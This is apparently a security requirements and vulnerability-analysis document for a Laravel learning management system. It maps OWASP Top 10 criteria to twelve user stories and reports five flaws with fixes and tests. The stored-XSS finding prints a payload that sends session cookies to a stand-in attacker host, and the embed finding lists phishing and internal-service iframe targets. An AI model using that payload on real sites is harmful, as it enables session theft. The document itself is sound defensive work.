# Security by User Story

Security requirements and acceptance criteria specific to the LMS-CMS, derived from the user stories defined in [readme.md](./readme.md#5-user-stories).

## Table of Contents

1. [Scope and exclusions](#scope-and-exclusions)
2. [Criteria by user story (HU-1 … HU-12)](#hu-1--create-courses)
3. [Summary matrix OWASP ↔ User stories](#summary-matrix-owasp--user-stories)
4. [Traceability](#traceability)
5. [Detected vulnerability analysis (OWASP Top 10)](#detected-vulnerability-analysis-owasp-top-10)
   - [V1 — Stored XSS in lesson content](#v1--stored-xss-in-lesson-content-a03-injection)
   - [V2 — Unauthorized direct access to uploaded files](#v2--unauthorized-direct-access-to-uploaded-files-a01-broken-access-control)
   - [V3 — Unvalidated embed URLs in plugins](#v3--unvalidated-embed-urls-in-plugins-a03-injection--malicious-embedded-content)
   - [V4 — Compromised quiz integrity](#v4--compromised-quiz-integrity-a04-insecure-design--a08-integrity-failures)
   - [V5 — Privilege escalation in enrollment](#v5--privilege-escalation-in-enrollment-a01-broken-access-control)

---

This document covers only the risks and controls **tied to the functional flow of each user story**. The following controls are considered **application-wide** and are documented/implemented at the global level (see section 2.5 of `readme.md`):

- Authentication, session management, and logout.
- Role-based authorization (`teacher` / `student`) and the `EnsureRole` middleware.
- Data encryption in transit (TLS/HTTPS).
- CSRF protection on forms.
- Password hashing and credential policies.

OWASP references align with the [OWASP Top 10 (2021)](https://owasp.org/Top10/).

---

## HU-1 — Create courses

**User story:** As a teacher, I want to create courses to organize my educational content.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-1-S01 | Course creation fields (title, description, metadata) are validated on the server with types, maximum lengths, and allowed character sets; errors do not reveal internal database structure. | A03 Injection |
| HU-1-S02 | Each course is linked to the creating teacher's `user_id`; subsequent operations on that course verify **resource ownership**, not just the generic role. | A01 Broken Access Control |
| HU-1-S03 | Only attributes defined in the model whitelist (`$fillable` / DTO) may be assigned at creation; sensitive fields (`id`, `status`, foreign `user_id`) are not assignable from the request. | A04 Insecure Design |
| HU-1-S04 | Title and description are escaped or sanitized when rendered in Blade views to prevent XSS storage and execution. | A03 Injection |

### Non-functional requirements

- Maximum title length: 255 characters; description: configurable limit (e.g. 10,000 characters).
- Response to invalid creation attempts: HTTP 422 with generic messages.
- Audit logging (user, timestamp, `course_id`) on create operations.

---

## HU-2 — Add lessons to a course

**User story:** As a teacher, I want to add lessons to a course to structure the material.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-2-S01 | A lesson may only be created if the `course_id` belongs to the authenticated teacher; requests with a third-party `course_id` return HTTP 403/404 without leaking resource existence. | A01 Broken Access Control |
| HU-2-S02 | The `content` field (JSON) is validated against an allowed schema (block types, depth, maximum size in bytes); malformed or oversized JSON is rejected. | A03 Injection / A04 Insecure Design |
| HU-2-S03 | When rendering lesson content, any HTML/text fragment from the JSON is treated as untrusted (contextual escaping or whitelist sanitization). | A03 Injection |
| HU-2-S04 | `position` and `due_at` are validated on the server; negative values, inconsistent dates, or order manipulation outside the authorized course are not accepted. | A04 Insecure Design |

### Non-functional requirements

- Maximum JSON content size: defined and enforced on the server (e.g. 512 KB).
- Lesson and associated question insertion in an atomic transaction to avoid inconsistent states.

---

## HU-3 — Publish a course

**User story:** As a teacher, I want to publish a course so students can access it.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-3-S01 | The `draft` → `published` state transition may only be executed by the course owner; no endpoint allows publishing third-party courses by manipulating identifiers. | A01 Broken Access Control |
| HU-3-S02 | A course cannot be published without at least one valid lesson (business rule that reduces exposure of empty or misconfigured resources). | A04 Insecure Design |
| HU-3-S03 | After publishing, listing and detail responses for students do not include internal draft metadata or debug fields. | A01 Broken Access Control |
| HU-3-S04 | Cache invalidation for the published course listing runs in a controlled manner to avoid serving stale content after visibility changes. | A08 Software and Data Integrity Failures |

### Non-functional requirements

- The publish action is idempotent: repeating the request on an already published course does not alter integrity or cause unwanted side effects.
- Audit event logged when publication state changes.

---

## HU-4 — Interactive plugins with drag & drop

**User story:** As a teacher, I want to add interactive plugins with drag & drop.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-4-S01 | File uploads (video, image, attachments) validate extension, actual MIME type, maximum size (128 MB), and are stored outside the executable public directory; access is served through controlled routes, not via predictable direct URLs. | A01 Broken Access Control / A05 Security Misconfiguration |
| HU-4-S02 | Files with executable extensions (`.php`, `.js`, `.svg` with script, etc.) and deceptive double extensions are rejected. | A03 Injection |
| HU-4-S03 | `video_embed` and `h5p_embed` plugins validate allowed scheme and domain; URLs that allow malicious embedded content (phishing, clickjacking) or iframes to unexpected internal hosts are rejected. | A03 Injection |
| HU-4-S04 | Each plugin instance's JSON configuration is validated by `plugin_type` (required fields, types, and limits); arbitrary keys that alter renderer behavior are not accepted. | A08 Software and Data Integrity Failures |
| HU-4-S05 | H5P content and HTML blocks are rendered in a restricted context (iframe `sandbox` or strict sanitization) to mitigate stored XSS. | A03 Injection |
| HU-4-S06 | Plugin reorder and delete operations verify that the instance belongs to a lesson in the requesting teacher's course. | A01 Broken Access Control |

### Non-functional requirements

- Limit on plugin instances per lesson (e.g. 50) to mitigate resource exhaustion.
- Stored filenames use non-predictable identifiers (UUID), never the client's original name.

---

## HU-5 — Dynamic quiz question management

**User story:** As a teacher, I want to manage quiz questions dynamically.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-5-S01 | Question text and options are validated (length, minimum/maximum number of options ≥ 2) and sanitized on display. | A03 Injection |
| HU-5-S02 | The correct answer (`correct_answer`) and correction details **are not** included in API responses or student views before quiz submission. | A01 Broken Access Control |
| HU-5-S03 | JSON options are serialized safely; no code is evaluated and no server-side templates are interpreted from teacher content. | A03 Injection |
| HU-5-S04 | Question create, update, and delete operations verify that the lesson/quiz belongs to the authenticated teacher's course. | A01 Broken Access Control |

### Non-functional requirements

- Limit on questions per lesson (e.g. 100) and options per question (e.g. 10).
- Bulk question insertion within a transaction with rollback on partial failure.

---

## HU-6 — Assign users to a course (drag & drop)

**User story:** As a teacher, I want to assign users to a course via drag & drop.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-6-S01 | Only existing users with the `student` role may be enrolled; no users are created and no privileges are elevated from the enrollment panel. | A04 Insecure Design |
| HU-6-S02 | Enrollment JSON APIs (`POST`/`DELETE`) verify course ownership and return 403/404 for unauthorized `course_id` or `user_id`. | A01 Broken Access Control |
| HU-6-S03 | Duplicate enrollment is prevented and referential integrity (`user_id`, `course_id`) is validated on the server, regardless of drag & drop client state. | A08 Software and Data Integrity Failures |
| HU-6-S04 | Enrollment panel responses do not expose unnecessary personal data (only identifiers and name/email required for the operation). | A02 Cryptographic Failures* |

\* *PII exposure minimization in the context of this functionality, not encryption in transit.*

### Non-functional requirements

- Limit on enrollment requests per minute per course (functional rate limiting) to mitigate automated abuse.
- Audit logging: who enrolled/unenrolled whom and when.

---

## HU-7 — View published courses (student)

**User story:** As a student, I want to view published courses.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-7-S01 | Course listing and detail for students strictly filter by `status = published`; courses in `draft` are not accessible, including via ID enumeration. | A01 Broken Access Control |
| HU-7-S02 | An unenrolled student does not access lesson content of a published course until enrollment is completed (if the business rule applies). | A01 Broken Access Control |
| HU-7-S03 | Responses do not include teacher data beyond what is necessary (e.g. do not expose full email if not a functional requirement). | A02 Cryptographic Failures* |

### Non-functional requirements

- Mandatory pagination on listings to avoid voluminous responses susceptible to resource exhaustion.

---

## HU-8 — View lessons with plugins (student)

**User story:** As a student, I want to view lessons with interactive plugins.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-8-S01 | Access to `/lessons/{lesson}` verifies enrollment in the course and published status; foreign lesson IDs return 403/404. | A01 Broken Access Control |
| HU-8-S02 | All content generated by teacher plugins is treated as untrusted when rendered (escape/sanitization/CSP) to prevent cross-user stored XSS. | A03 Injection |
| HU-8-S03 | Multimedia resources served from storage verify that the requester has access to the associated course/lesson, not just the file URL. | A01 Broken Access Control |
| HU-8-S04 | Plugin interactions (`/plugins/instances/{instance}/interact`) verify that the instance belongs to the lesson visible to the student. | A01 Broken Access Control |

### Non-functional requirements

- Security headers on lesson responses: restrictive `Content-Security-Policy` for iframes and inline scripts from educational content.
- Disable execution of unsanitized inline JavaScript in teacher code blocks except in an isolated environment.

---

## HU-9 — Answer quizzes and receive a score

**User story:** As a student, I want to answer quizzes and receive a score.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-9-S01 | The score is calculated **exclusively on the server** from submitted answers and stored questions; the client cannot submit manipulable `score` or `total`. | A04 Insecure Design |
| HU-9-S02 | Submitted answers are validated against question IDs existing in the lesson; out-of-set options or foreign questions are rejected. | A03 Injection |
| HU-9-S03 | A defined resubmission policy applies (one submission per lesson/user or time window); unauthorized retries do not overwrite results without an explicit rule. | A08 Software and Data Integrity Failures |
| HU-9-S04 | The response to the student after submission does not reveal correct answers for other questions or other users. | A01 Broken Access Control |

### Non-functional requirements

- Bounded maximum processing time for submission; HTTP 422 response for malformed payload.
- `quiz_results` persistence linked to `user_id` + `lesson_id` with uniqueness constraint per business policy.

---

## HU-10 — View student progress

**User story:** As a student, I want to view my progress.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-10-S01 | Progress queries filter by the authenticated session's `user_id`; another student's progress cannot be obtained by varying parameters. | A01 Broken Access Control |
| HU-10-S02 | Progress endpoints and views do not accept a client-manipulable `user_id` parameter. | A01 Broken Access Control |
| HU-10-S03 | Aggregated data shown to the student comes only from courses in which they are enrolled. | A01 Broken Access Control |

### Non-functional requirements

- Lesson completion markers are recorded on the server after validating actual lesson consumption (not just a GET request).

---

## HU-11 — Academic calendar and custom events (teacher)

**User story:** As a teacher, I want to view a monthly academic calendar and create custom events to plan the course.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-11-S01 | `academic_calendar_events` CRUD verifies that the event belongs to the creating teacher or to a course they own; edit/delete by foreign ID returns 403/404. | A01 Broken Access Control |
| HU-11-S02 | `title`, `type`, `starts_at`, and `ends_at` fields are validated on the server (`ends_at` ≥ `starts_at`, reasonable date range, event types on a whitelist). | A03 Injection / A04 Insecure Design |
| HU-11-S03 | Event title and description are escaped when rendered in the calendar to prevent stored XSS visible to enrolled students. | A03 Injection |
| HU-11-S04 | Events derived from lessons (`due_at`) and enrollments only show information within the user's academic scope (own or enrolled course). | A01 Broken Access Control |

### Non-functional requirements

- Limit on custom events per teacher/course (e.g. 500) to mitigate storage abuse.
- Logical or physical deletion with UI confirmation; operation logged in audit trail.

---

## HU-12 — Interface language switch (ES/EN)

**User story:** As a user, I want to change the interface language (ES/EN) and see translated navigation.

### Security acceptance criteria

| ID | Criterion | OWASP |
|----|-----------|-------|
| HU-12-S01 | The `locale` parameter in `/locale/{locale}` only accepts whitelist values (`es`, `en`); any other value is rejected or normalized without verbose errors. | A03 Injection |
| HU-12-S02 | After language change, redirection returns to a validated internal relative route; absolute external URLs in return parameters are not accepted (open redirect prevention). | A01 Broken Access Control |
| HU-12-S03 | The locale value is stored in session/server-side; it is not propagated to SQL queries or translation file inclusion outside `lang/{locale}/`. | A03 Injection |
| HU-12-S04 | Strings injected via `window.lmsT()` on the client come exclusively from server translation files, not from user input. | A03 Injection |

### Non-functional requirements

- The `SetLocale` middleware runs before rendering any authenticated view.
- Future additional language files must follow the same path convention and static content review.

---

## Summary matrix OWASP ↔ User stories

| OWASP Top 10 category | User stories where it applies (specific) |
|-----------------------|------------------------------------------|
| A01 Broken Access Control | HU-1, HU-2, HU-3, HU-4, HU-5, HU-6, HU-7, HU-8, HU-9, HU-10, HU-11, HU-12 |
| A02 Cryptographic Failures (PII minimization) | HU-6, HU-7 |
| A03 Injection (XSS, input validation) | HU-1, HU-2, HU-4, HU-5, HU-8, HU-9, HU-11, HU-12 |
| A04 Insecure Design | HU-1, HU-2, HU-3, HU-6, HU-9, HU-11 |
| A05 Security Misconfiguration | HU-4 (uploads and limits) |
| A08 Software and Data Integrity Failures | HU-3, HU-4, HU-6, HU-9 |
| Malicious embedded content (video/H5P embeds) | HU-4, HU-8 |

---

## Traceability

| User story | Related ticket | Related PR |
|------------|----------------|------------|
| HU-1, HU-2, HU-3 | Ticket 2 | PR 2 |
| HU-4 | Ticket 4 | PR 4 |
| HU-5, HU-9, HU-10 | Ticket 3 | PR 3 |
| HU-6 | Ticket 5 | PR 5 |
| HU-4 (uploads) | Ticket 6 | PR 6 |
| HU-11 | Ticket 7 | PR 7 |
| HU-12 | Ticket 8 | PR 8 |

---

## Detected vulnerability analysis (OWASP Top 10)

Static code analysis of [BurgosAngel/codigofinal](https://github.com/BurgosAngel/codigofinal/tree/angel-burgos-r/codigofinal/lms-cms-laravel12) (`angel-burgos-r` branch), prioritized by impact on user stories (HU-2, HU-4, HU-6, HU-8, HU-9). Controls already covered at the global level (authentication, roles, TLS, CSRF) are excluded.

Each vulnerability is documented in full — description, evidence, exploitation example and impact, and remediation — before moving to the next.

---

### V1 — Stored XSS in lesson content (A03: Injection)

**Severity:** Critical  
**Affected user stories:** HU-2, HU-8  
**Status:** Detected in current code

#### Description

The lesson editor allows the teacher to save rich HTML (Quill) inside the JSON `content` field. The student view renders that HTML with **unescaped** Blade directives (`{!! !!}`), turning any malicious fragment into stored XSS executable in the browser of all enrolled students.

#### Code evidence

In `resources/views/lessons/show.blade.php`, page content and text blocks are injected as-is:

```blade
<div class="ql-editor">{!! $page['html'] ?? '' !!}</div>
...
<div class="ql-editor">{!! $block['value'] ?? '' !!}</div>
```

The teacher persists that HTML via `LessonController::updateContent`, which accepts the `pages` array without HTML sanitization:

```php
$lesson->update(['content' => $validated['pages']]);
```

#### Concrete exploitation example

1. A teacher (or an attacker who compromises their account) edits a lesson and inserts the following in Quill HTML mode:
   ```html
   <img src=x onerror="fetch('https://attacker.evil/log?c='+document.cookie)">
   ```
2. They save the content (`PATCH /lessons/{id}/content`).
3. Any enrolled student opens `/lessons/{id}`.
4. The script runs in the context of the student's session → session cookie theft, actions on behalf of the user, or phishing redirect.

**Why this is the most important vulnerability:** it affects **all** content consumers (HU-8), the vector is persistent (stored in the database), and the impact is client-side code execution with authenticated student privileges.

#### Impact

| Dimension | Effect |
|-----------|--------|
| Confidentiality | Session theft, exfiltration of data visible on the page |
| Integrity | Unauthorized actions via JavaScript (quiz submission, profile changes if no additional protection) |
| Availability | Defacement of the lesson interface |

#### Proposed remediation

1. **Sanitize on save on the server:** integrate an HTML whitelist library (e.g. `HTMLPurifier` or `stevebauman/purify`) in `UpdateLessonContentRequest` / `LessonController::updateContent`, allowing only safe tags (`p`, `b`, `i`, `ul`, `li`, `a[href]`, `img[src]` without event handlers).
2. **Escape on render as defense in depth:** replace `{!! !!}` with `{{ }}` where content must be plain text; where HTML is required, always pass through the same sanitizer in the view:
   ```blade
   <div class="ql-editor">{!! clean($page['html'] ?? '') !!}</div>
   ```
3. **CSP header** on lesson responses: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';` to block residual inline scripts.
4. **Regression test:** Feature test that creates a lesson with `<script>alert(1)</script>` and verifies the rendered output does not contain `<script>`.

---

### V2 — Unauthorized direct access to uploaded files (A01: Broken Access Control)

**Severity:** High  
**Affected user stories:** HU-4, HU-8  
**Status:** Detected in current code

#### Description

Lesson videos and plugin assets are stored on Laravel's `public` disk (`storage/app/public`). The generated link (`/storage/plugin-assets/{id}/…` or `/storage/lesson-content/{id}/…`) is **public and predictable**, without checking whether the downloader is authenticated or enrolled in the course.

#### Code evidence

In `PluginController::uploadAsset`:

```php
$path = $file->store('plugin-assets/'.$instance->id, 'public');
// ...
'uri' => '/storage/'.$path,
```

In `LessonController::uploadContentVideo`:

```php
$path = $request->file('file')->store('lesson-content/'.$lesson->id, 'public');
return response()->json(['url' => asset('storage/'.$path)]);
```

Nginx serves `/storage/` as static files; `LessonPolicy::viewAsStudent` is not involved.

#### Concrete exploitation example

1. An enrolled student uploads or views a lesson with a local video and obtains the URL:
   `http://localhost:8080/storage/lesson-content/3/abc123.mp4`
2. They share the URL via chat or extract it from the page HTML.
3. An **unauthenticated** user (or a student **not enrolled** in that course) opens the URL directly in the browser.
4. The video downloads/plays with no session or enrollment check.

**Justification:** violates the least-privilege principle of HU-8 (only enrolled students should access material) and exposes restricted educational content or PII in recordings.

#### Impact

| Dimension | Effect |
|-----------|--------|
| Confidentiality | Leakage of course content, private videos, PDF/DOCX documents uploaded as plugins |
| Integrity | Does not alter data, but facilitates unauthorized distribution |
| Availability | Possible hotlinking and bandwidth exhaustion |

#### Proposed remediation

1. **Store on private disk** (`local` or `s3` with non-public bucket), not on `public`:
   ```php
   $path = $file->store('plugin-assets/'.$instance->id, 'local');
   ```
2. **Controlled download route** with authorization:
   ```php
   Route::get('/media/{asset}', [MediaController::class, 'show'])
       ->middleware('auth')
       ->name('media.show');
   ```
   In the controller: resolve the asset, load the associated lesson, and `Gate::authorize('viewAsStudent', $lesson)` (or `update` for the teacher).
3. **Signed temporary URLs** (Laravel `Storage::temporaryUrl`) for S3, or HMAC tokens with expiration for local servers.
4. **Rename files** with UUID (partially covered by Laravel `store()`); do not include `original_name` in the public path.
5. **Test:** GET request to `/storage/lesson-content/1/x.mp4` without session cookie must return 403 or 404 after the change.

---

### V3 — Unvalidated embed URLs in plugins (A03: Injection / malicious embedded content)

**Severity:** High  
**Affected user stories:** HU-4, HU-8  
**Status:** Detected in current code

#### Description

The `video_embed` and `h5p_embed` plugins insert the URL configured by the teacher directly into an `<iframe>` or `<video>`, without domain whitelisting or scheme validation. The risk is **malicious embedded content** in the user's browser: **phishing iframes**, **clickjacking**, and loading unexpected internal pages within the LMS visual context. There is no server-to-server request; the backend does not fetch those URLs.

#### Code evidence

`resources/views/plugins/_h5p_embed.blade.php`:

```blade
<iframe src="{{ $settings['embed_url'] ?? '' }}" ...></iframe>
```

`resources/views/plugins/_video_embed.blade.php` — if the URL is not YouTube/Vimeo/local, it is used as-is:

```blade
<iframe src="{{ $embedUrl }}" width="100%" height="400" ...></iframe>
```

`PluginController::update` accepts `settings_json` as a free-form array without validating fields by plugin type.

#### Concrete exploitation example

**Scenario A — Embedded phishing**

1. A teacher (or compromised account) configures a `video_embed` plugin with URL:
   `https://fake-lms-login.evil/clone-dashboard`
2. Students see a phishing iframe page within the trusted LMS environment.
3. Higher success rate for credential theft due to the legitimate visual context.

**Scenario B — Iframe to internal service (client-side only)**

1. A teacher configures `h5p_embed` with:
   `http://phpmyadmin:80` or `http://localhost:8082` (phpMyAdmin from `docker-compose.yml`).
2. The student's browser (or the teacher's in preview) loads the iframe against the exposed database admin panel in development.
3. If the internal service requires no additional auth, the management interface is exposed in the LMS context (client-side confidentiality risk, not server-side SSRF).

**Justification:** iframe content is presented under the appearance of the LMS; in Docker environments the combination with [A05 Security Misconfiguration](#v2--unauthorized-direct-access-to-uploaded-files-a01-broken-access-control) amplifies the risk.

#### Impact

| Dimension | Effect |
|-----------|--------|
| Confidentiality | Credential phishing; possible visual access to internal consoles |
| Integrity | Deceptive content displayed as official course material |
| Availability | Iframes to heavy resources may degrade the experience |

#### Proposed remediation

1. **Validate `settings_json` by plugin slug** in `PluginController::update` / `store` with dedicated rules:
   ```php
   // video_embed
   'settings_json.url' => ['required', 'url', 'regex:/^https:\/\/(www\.)?(youtube\.com|youtu\.be|vimeo\.com)\//'],
   // h5p_embed
   'settings_json.embed_url' => ['required', 'url', 'starts_with:https://h5p.org/'],
   ```
2. **Reject** URLs with schemes `javascript:`, `data:`, private IPs (RFC 1918), `localhost`, `127.0.0.1`, and cloud metadata (`169.254.169.254`).
3. **`sandbox` attribute** on third-party iframes:
   ```blade
   <iframe src="{{ $embedUrl }}" sandbox="allow-scripts allow-same-origin" ...>
   ```
4. **Transform URLs** to embed format only for allowed domains (as YouTube/Vimeo already do); for any other domain → reject.
5. **Feature test:** teacher attempts to save a plugin with `embed_url=http://127.0.0.1:8082` → 422 response.

---

### V4 — Compromised quiz integrity (A04: Insecure Design / A08: Integrity Failures)

**Severity:** Medium-High  
**Affected user stories:** HU-9, HU-10  
**Status:** Detected in current code

#### Description

The `POST /quiz/submit` endpoint recalculates the score on the server (correct), but **does not limit the number of attempts** or prevent progress overwrite. Each submission creates a new `QuizResult` and unconditionally marks the lesson as completed.

#### Code evidence

`QuizController::submit`:

```php
QuizResult::create([
    'user_id' => $request->user()->id,
    'lesson_id' => $lesson->id,
    'score' => $score,
    'total' => $total,
]);

Progress::updateOrCreate(
    ['user_id' => $request->user()->id, 'lesson_id' => $lesson->id],
    ['completed_at' => now()],
);
```

No `unique(user_id, lesson_id)` constraint exists on `quiz_results` nor prior attempt check. `SubmitQuizRequest` only requires `lesson_id` and `answers` — it does not validate that `answers` keys correspond to question IDs in the lesson (beyond calculation that ignores unknown IDs).

#### Concrete exploitation example

1. A student opens a lesson with a 5-question quiz and submits random answers → score 1/5.
2. They repeat `POST /quiz/submit` with different combinations (automatable with a script).
3. On attempt N they get all correct → score 5/5.
4. Each attempt runs `Progress::updateOrCreate` → the lesson is marked **completed** even with a low score on earlier attempts.
5. A progress report (HU-10) will show the lesson as completed regardless of the academic pass policy.

**Variant:** submit empty `answers` or invented IDs — score is 0 but progress is still marked completed, falsifying tracking.

#### Impact

| Dimension | Effect |
|-----------|--------|
| Confidentiality | Low (does not directly leak correct answers; options are already in the HTML) |
| Integrity | **High** — unreliable scores and progress for academic assessment |
| Availability | Mass resubmissions may generate database load (`quiz_results`) |

#### Proposed remediation

1. **Attempt policy** in `QuizController::submit`:
   ```php
   $attempts = QuizResult::where('user_id', $user->id)
       ->where('lesson_id', $lesson->id)->count();
   abort_if($attempts >= 3, 422, 'Maximum attempts reached');
   ```
2. **Uniqueness constraint** per business rule — migration:
   ```sql
   UNIQUE (user_id, lesson_id)  -- if only one attempt is allowed
   ```
   or a `quiz_attempts` table with attempt number and best score.
3. **Validate answer keys** in `SubmitQuizRequest`:
   ```php
   'answers' => ['required', 'array', new AnswersMatchLessonQuestions($lesson)],
   ```
4. **Decouple progress from submission:** set `completed_at` only if `score / total >= threshold` (e.g. 0.6) or after the first valid submission per documented policy.
5. **Feature test:** two consecutive submissions with a 1-attempt policy → second returns 422; progress is not marked if score < threshold.

---

### V5 — Privilege escalation in enrollment (A01: Broken Access Control)

**Severity:** Medium  
**Affected user stories:** HU-6  
**Status:** Detected in current code

#### Description

The enrollment panel allows the course manager to assign users with `role: teacher` in addition to `student`. A course owner can add **any system user with the global teacher role** as a co-teacher of the course, granting them management permissions (`canManageCourse`) over content, enrollments, and publication.

#### Code evidence

`EnrollmentController::enroll`:

```php
$validated = $request->validate([
    'user_id' => ['required', 'integer', 'exists:users,id'],
    'role' => ['required', 'in:teacher,student'],
]);
// ...
CourseEnrollment::updateOrCreate(
    ['course_id' => $course->id, 'user_id' => $user->id],
    ['role' => $validated['role'], 'enrolled_at' => now()],
);
```

`User::canManageCourse` grants management if the user is enrolled with pivot `role = teacher`:

```php
return $this->enrolledCourses()
    ->whereKey($course->id)
    ->wherePivot('role', 'teacher')
    ->exists();
```

#### Concrete exploitation example

1. Teacher A creates the course "Software Engineering" (course id=5).
2. From `/courses/5/enrollments`, they drag Teacher B (`teacher@example.com`) into the enrolled panel with `role: teacher`.
3. Teacher B (who did not create the course) accesses `/courses/5`, edits lessons, enrolls students, and publishes/unpublishes the course.
4. If Teacher A is removed or leaves the institution, Teacher B retains full control without being the owner `user_id`.

**Justification:** HU-6 describes assigning users to a course, but does not anticipate that a teacher can delegate **management permissions** to third parties without additional controls; this is horizontal privilege escalation at the resource level.

#### Impact

| Dimension | Effect |
|-----------|--------|
| Confidentiality | Unauthorized co-teachers access drafts and student lists |
| Integrity | Third parties can alter content, quizzes, and enrollments |
| Availability | Course publish/unpublish by an unexpected actor |

#### Proposed remediation

1. **Restrict enrollment roles** to the HU-6 use case (students only), unless an explicit "add co-teacher" flow exists:
   ```php
   'role' => ['required', 'in:student'],  // default enroll endpoint
   ```
2. **Separate endpoint** `POST /courses/{course}/co-teachers` protected by `CoursePolicy::inviteTeacher`, limited to the owner (`user_id`) or `Admin` role.
3. **Mandatory audit** on `course_enrollments` with `invited_by_user_id` and notification to the added user.
4. **Co-teacher limit** per course and explicit UI confirmation ("X will be able to edit and publish this course").
5. **Feature test:** non-owner teacher attempts `POST /courses/{id}/enrollments` with `role: teacher` → 403.

---

## References

- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- Analyzed source code: [BurgosAngel/codigofinal](https://github.com/BurgosAngel/codigofinal/tree/angel-burgos-r/codigofinal/lms-cms-laravel12) (`angel-burgos-r` branch)
- Global controls: [readme.md § 2.5](./readme.md#25-security)
